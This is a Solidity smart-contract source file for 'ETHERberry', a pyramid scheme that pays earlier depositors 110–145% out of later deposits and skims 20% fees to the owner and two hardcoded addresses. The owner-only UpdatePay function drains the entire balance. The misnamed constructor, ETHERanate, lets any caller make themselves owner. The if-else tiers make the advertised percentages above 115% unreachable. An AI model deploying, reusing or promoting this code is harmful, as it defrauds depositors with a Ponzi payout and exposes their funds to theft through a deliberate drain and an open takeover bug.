1 /*
2 etherberry - ethereum strawberry
3 
4 Ladder deposit based contract with float percentage based on EtheriumPyramidSample on GitHub.
5 
6 ETHERberry allows to deposit with float multiplier percent of outcome payment
7 
8 */
9 contract ETHERberry 
10 {
11     struct Payer 
12     {
13         address ETHaddress;
14         uint ETHamount;
15     }
16 
17     Payer[] public persons;
18 
19     uint public paymentqueue = 0;
20     uint public feecounter;
21     uint amount;
22     
23     address public owner;
24     address public ipyh=0x5fD8B8237B6fA8AEDE4fdab7338709094d5c5eA4;
25     address public hyip=0xfAF7100b413465Ea0eB550d6D6a2A29695A6f218;
26     address meg=this;
27 
28     modifier _onlyowner
29     {
30         if (msg.sender == owner)
31         _
32     }
33     
34     function ETHERanate() 
35     {
36         owner = msg.sender;
37     }
38     function()                                                          
39     {
40         enter();
41     }
42     function enter()
43     {
44         if (msg.sender == owner)
45 	    {
46 	        UpdatePay();                                          
47 	    }
48 	    else                                                          
49 	    {
50             feecounter+=msg.value/5;                                  
51 	        owner.send(feecounter/2);                           
52 	        ipyh.send((feecounter/2)/2);                                 
53 	        hyip.send((feecounter/2)/2);
54 	        feecounter=0;                                            
55 	        
56             if ((msg.value >= (1 ether)/40) && (msg.value <= (1 ether)))                                
57             {
58 	            amount = msg.value;                                      
59 	            uint idx=persons.length;                                   
60                 persons.length+=1;
61                 persons[idx].ETHaddress=msg.sender;
62                 persons[idx].ETHamount=amount;
63                 canPay();                                              
64             }
65 	        else                                                         
66 	        {
67 	            msg.sender.send(msg.value - msg.value/5);                   
68 	        }
69 	    }
70 
71     }
72     
73     function UpdatePay() _onlyowner                                            
74     {
75         msg.sender.send(meg.balance);
76     }
77     
78     function canPay() internal                                                  
79     {
80         uint percent=110;  //if tx <0.05 ether - get 110%
81         if (persons[paymentqueue].ETHamount > (1 ether)/20) //if tx > 0.05 ether - get 115%
82         {
83             percent =115;
84         }
85         else if (persons[paymentqueue].ETHamount > (1 ether)/10) //if tx > 0.1 ether - get 120%
86         {
87             percent = 120;
88         }
89         else if (persons[paymentqueue].ETHamount > (1 ether)/5)  //if tx >0.2 ether - get 125%
90         {
91             percent = 125;
92         }
93         else if (persons[paymentqueue].ETHamount > (1 ether)/4)  //if tx > 0.25 ether - get 130%
94         {
95             percent = 130;
96         }
97         else if (persons[paymentqueue].ETHamount > (1 ether)/2)   //if tx > 0.5 ether - get 140%
98         {
99             percent = 140;
100         }
101         else if (persons[paymentqueue].ETHamount > ((1 ether)/2 + (1 ether)/4))  // if tx > 0.75 ether - get 145%
102         {
103             percent = 145;
104         }
105         while (meg.balance>persons[paymentqueue].ETHamount/100*percent)             
106         {
107             uint transactionAmount=persons[paymentqueue].ETHamount/100*percent;     
108             persons[paymentqueue].ETHaddress.send(transactionAmount);           
109             paymentqueue+=1;                                                    
110         }
111     }
112 }